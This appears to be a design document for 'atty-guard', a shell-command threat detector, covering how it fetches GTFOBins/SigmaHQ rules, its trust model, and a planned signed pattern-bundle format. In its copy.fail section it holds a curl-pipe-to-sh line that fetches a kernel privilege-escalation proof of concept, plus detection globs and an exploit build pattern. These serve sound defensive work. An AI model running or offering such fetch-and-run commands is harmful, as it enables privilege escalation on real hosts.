# security guard — pattern updates

How atty/atty-guard get fresh threat data **between releases**. Driven by incidents like Shai-Hulud (npm worm, hundreds of compromised packages) and CVE-2026-31431 / copy.fail (kernel LPE with a tiny, easily-renamed PoC) — both of which we'd want to flag the day disclosure lands, not on the next atty cargo-release cadence.

## What's actually shipped today (atom fetcher)

The signed-bundle design described in the rest of this doc was never built. What ships today is **V2-I — the atom fetcher** (`atty-guard/src/atom_fetcher.rs`, feature-gated behind `atoms-fetch`). It pulls the GTFOBins and SigmaHQ Linux rule corpora directly from GitHub `codeload`, walks the tarballs, extracts atom strings, and writes the merged corpus to `/var/lib/atty-guard/atoms.system.txt`. Run via `atty-guard --update-atoms-now` (one-shot) or `--atoms-update-interval 6h` (background cron).

### Trust model (what we actually verify)

The fetcher's trust posture as of this PR:

| Layer | What it bounds | What it doesn't |
|-------|----------------|-----------------|
| HTTPS to codeload.github.com (rustls) | Transport tampering, passive MITM | Doesn't authenticate the *content* — anyone with push access to upstream can change what `refs/heads/master` resolves to between fetches. |
| Tarball size cap (32 MiB hard ceiling in `download_tarball`) | An upstream pushing a multi-GB blob (intentional or accidental) can't exhaust daemon memory. | Doesn't catch a 30 MiB tarball stuffed with attacker-friendly atoms — only the gross-blowup case. |
| Atom count cap (`MAX_ATOMS_TOTAL = 10_000` in `fetch_all`) | A parser bug or a tarball that *somehow* yields a huge atom set can't balloon the in-memory aho-corasick DFA. Refuses the write, keeps the last-good `atoms.system.txt`. | Doesn't reject a 9 999-atom corpus that's mostly attacker-controlled noise. |
| Per-atom length cap (`ATOM_MAX_LEN = 200` in `atom_from_code`) | YAML parser swallows that produce 4 KiB "atoms" get dropped. | Doesn't reject a well-formed 100-char malicious atom. |
| Placeholder filter (`is_placeholder_atom_public`) | Sigma `/path/to/`, LOLBAS `{PATH:.ext}`, angle-bracket templates filtered out. | Doesn't validate atom *content* beyond shape. |

**The trust root is "we trust GitHub + the GTFOBins/SigmaHQ maintainers."** That's a substantial trust assumption. The signed-bundle design below was the originally-planned hardening; it never landed because the operational cost of running a signing infrastructure didn't survive contact with the maintainer's time budget.

### Opt-in commit pinning (`/etc/atty-guard/atoms.pins.toml`)

For sites that want a review gate before upstream changes reach the running daemon:

1. Copy `/etc/atty-guard/atoms.pins.toml.example` to `/etc/atty-guard/atoms.pins.toml`.
2. Uncomment per-source blocks and set `commit` (40-char SHA-1) + `sha256` (64-char SHA-256 of the tarball at that commit).
3. The fetcher hits the pinned commit URL instead of `refs/heads/master`, computes SHA-256, refuses to overwrite `atoms.system.txt` on mismatch. Last-good file stays in place.

Pin refresh procedure when bumping:

```sh
gh api /repos/<owner>/<repo>/commits/master --jq .sha
curl -fsSL "https://codeload.github.com/<owner>/<repo>/tar.gz/<sha>" | sha256sum
```

Paste both values into the pin file. The next cron tick (or `--update-atoms-now`) picks up the new pin — `spawn_periodic_refresh` re-reads `atoms.pins.toml` every tick, so no daemon restart is needed for a pin bump. Malformed pin file is a HARD error: the operator opted in for a reason and silent fall-back to live tracking would defeat the point. If the pin file is malformed at startup with `--atoms-update-interval`, the cron thread is skipped but the classifier (UDS server) keeps running — the auxiliary refresh path can fail without taking the whole classifier down.

A drift-detection follow-up will land soon: the daemon will probe upstream's `refs/heads/master` SHA per source, write the result to `/var/lib/atty-guard/atoms.drift.json`, and surface "N commits behind" warnings via `atty doctor` + journald. Until that ships, operators audit drift by hand.

## Original signed-bundle design (NOT shipped)

Status: **design only.** The rest of this document describes a more complete trust model that has not been implemented. Treat it as a roadmap, not a description of current behavior.

## Goals

- **Same-day IOCs.** When a major incident lands, ship a signed pattern bundle that atty-guard installs in seconds. No atty rebuild required.
- **Verifiable.** Bundles are Ed25519-signed; atty-guard pins the publisher key at compile time. A compromised CDN can't push malicious bundles.
- **Offline-safe.** If the update server is unreachable atty-guard keeps using its last-good bundle (or the bundled-in defaults). Never fail-open.
- **Multi-source.** OSV / GitHub Advisory DB / kernel.org CVE feed each speak different formats — atty-guard's update layer **normalises** to one bundle shape, fetched from one publisher we control.

## Bundle format

A bundle is a `tar.zst` of declarative data files plus a manifest. Tiny — current footprint is ~10 KB compressed.

```
atty-guard-data-2026-05-19.tar.zst
├── manifest.toml          required, signed below
├── flagged_npm.txt        same shape as the bundled-in seed file
├── flagged_urls.txt       known IOC URLs (PoC hosts, malicious CDNs)
├── flagged_kernel.toml    CVE → match-shape mappings for kernel exploits
└── heuristics.toml        regex tweaks for the Tier-2 HeuristicBackend
```

### `manifest.toml`

```toml
[bundle]
version    = "2026-05-19"          # ISO date — bundles versioned by publication day
schema     = 1                      # bumped only on breaking field changes
expires_at = "2026-11-19T00:00:00Z" # 6-month TTL; atty-guard refuses bundles past this

[publisher]
# Pinned in atty-guard at compile time; bundles signed with a different
# key are rejected.
ed25519_pubkey_id = "atty-pattern-publisher-v1"

[contents]
# Files this bundle ships. Each gets a SHA-256 so a corrupted file fails
# verification individually (the bundle-level signature covers the manifest
# only; per-file hashes prevent in-archive tampering).
"flagged_npm.txt"       = "sha256:7a2b…"
"flagged_urls.txt"      = "sha256:e1c8…"
"flagged_kernel.toml"   = "sha256:1f9d…"
"heuristics.toml"       = "sha256:5c8a…"
```

The `.sig` lives next to the `.tar.zst`:

```
atty-guard-data-2026-05-19.tar.zst.sig    # Ed25519(manifest.toml)
```

## Verification protocol

```
fetch(<source>/atty-guard-data-LATEST.tar.zst)
fetch(<source>/atty-guard-data-LATEST.tar.zst.sig)
verify_ed25519(manifest.toml, .sig, pinned_pubkey)
for file in manifest.contents:
    extract_to_tmp(file)
    verify_sha256(file)
check_not_expired(manifest.expires_at)
atomic_rename(tmp_dir → $XDG_DATA_HOME/atty-guard/patterns/)
SIGHUP self
```

Each step fails open to "keep using current bundle" — we never delete or replace partial data.

## Source

Initial: GitHub Releases on `fentas/atty-guard-data` (separate repo for clean signing key rotation, separate review). Published by CI from a curated source of truth that auto-mirrors:

- **OSV API** for npm/PyPI/cargo malicious-package disclosures.
- **GitHub Advisory DB** for ecosystem CVEs.
- **kernel.org CVE feed** (RSS) for kernel LPEs / RCEs.
- **Maintainer-curated** for IOC URLs (exploit PoC hosting, malicious CDN domains, copy.fail-class incident pages).

The aggregation lives in `fentas/atty-guard-data`'s CI; output is the signed bundle. atty-guard doesn't poll OSV/GitHub directly — it just consumes the merged feed.

## Schedule

| Stage | What lands | When |
|-------|------------|------|
| 1 | This doc + skeleton `data_update.rs` + bundle-format types. | This PR. |
| 2 | Local-file source (`atty-guard --update-from /path/to/bundle.tar.zst`). Useful for testing, offline-installs, air-gapped envs. | Next PR. |
| 3 | HTTPS fetcher + signature verification + atomic install. | After Stage 2 lands + a real signing key is set up. |
| 4 | systemd timer for periodic refresh (system-level, `OnCalendar=daily` + `RandomizedDelaySec` to avoid synchronised thundering herds). | After Stage 3. |
| 5 | Schema 2 — adds runtime-reloadable Tier-2 heuristics + structured kernel-exploit shapes. | When the bundle outgrows v1. |

## Why not pull OSV / GitHub Advisory directly from atty-guard

Tempting (one less repo to ship), but:

- **Rate limits / API tokens.** OSV is generous; GitHub Advisory needs a token. Distributing tokens to every atty install is the wrong shape.
- **Privacy.** Hitting OSV directly leaks which atty installs are active. The aggregated bundle decouples that.
- **Normalisation.** OSV records every npm bad-package since 2020 — far more than the focused fast-path list atty's V1 wants. The aggregator filters down to high-confidence, recent, high-blast-radius entries.

V2-F (the "live OSV lookup at classify time" follow-up from `security-guard-design.md`) is still on the roadmap — but it's the SECOND layer behind this offline-bundle path, not a replacement.

## Why a separate signing key from atty's release

- atty maintainer key signs `atty` binaries.
- `atty-pattern-publisher-v1` key signs pattern bundles.
- Different rotation cadence (pattern bundles ship more often).
- Compromising the binary key shouldn't auto-let an attacker push pattern updates that downgrade detection.

Keys live in a hardware token (YubiKey or equivalent), not on the CI runner. CI fetches a one-shot signature via maintainer push.

## copy.fail-specific notes

CVE-2026-31431 is a kernel LPE — atty can't catch it from typed commands directly. What we CAN add via this update channel:

- **`flagged_urls.txt`** — the Theori PoC repo URL + known mirrors. `curl https://github.com/<theori>/copyfail | sh` would trigger.
- **`flagged_kernel.toml`** — the CVE → shell-shape mapping. Future:
  ```toml
  [["CVE-2026-31431"]]
  description = "copy.fail LPE — AF_ALG + splice race"
  fetcher_globs = [
      "*github.com/theori-io/copyfail*",
      "*copyfail.security*",
  ]
  build_patterns = [
      "gcc -static -o /tmp/* */copy*.c",
  ]
  ebpf_hint = "lsm/socket_create AF_ALG from short-lived process"
  ```
- **eBPF hint** — V2-B's tracepoint catalogue grows a `socket_create(AF_ALG)` watcher. The bundle declares the hint; atty-guard's BPF program reads it on startup.

The kernel-side eBPF watcher is the only reliable detection of an actual exploitation attempt. The typed-line patterns catch "user knowingly fetches the public PoC"; an attacker who already has shell access skips all of that.
